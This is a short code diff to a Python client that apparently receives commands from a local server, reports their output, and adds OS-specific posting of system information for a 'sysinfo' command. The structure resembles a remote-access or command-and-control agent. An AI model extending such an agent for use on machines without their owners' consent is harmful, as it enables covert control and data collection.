@@ -7,6 +7,7 @@ from time import sleep
 from uuid import getnode as generateID
 import subprocess
 import Information
+from sys import platform
 
 SERVER_URL = "http://localhost:6969/api/"
 MY_ID = generateID()
@@ -38,7 +39,17 @@ def main():
             sendReponse({'id':MY_ID,'command_id': command['id'],'response': output})
             print(output)
         if command['command'] == 'sysinfo':
-            sendReponse(Information.getInfo())
+            if platform == "linux" or platform == "linux2": # Linux
+                response = requests.post(SERVER_URL + "sysinfo",data={'id': MY_ID, 'info': Information.Linux.getInfo()})
+                print(response)                
+            elif platform == "darwin": # OS X
+                pass
+            elif platform == "win32": # Windows
+                response = requests.post(SERVER_URL + "sysinfo",data={'id': MY_ID, 'info': Information.win32.getInfo()})
+                print(response)
+
+
+            
     #else:
     #    sleep(5)
 
